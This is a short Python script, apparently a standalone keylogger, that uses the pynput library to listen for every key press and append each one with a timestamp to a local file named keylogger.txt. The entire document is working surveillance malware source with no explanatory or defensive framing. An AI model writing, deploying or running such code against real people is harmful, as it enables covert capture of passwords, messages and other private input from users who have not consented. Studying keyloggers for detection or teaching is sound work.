from pynput.keyboard import *
import logging

log_directory = ""
logging.basicConfig(filename=(log_directory + "keylogger.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')


def on_start(key):
    logging.info(str(key))


with Listener(on_press=on_start) as listener:
    listener.join()
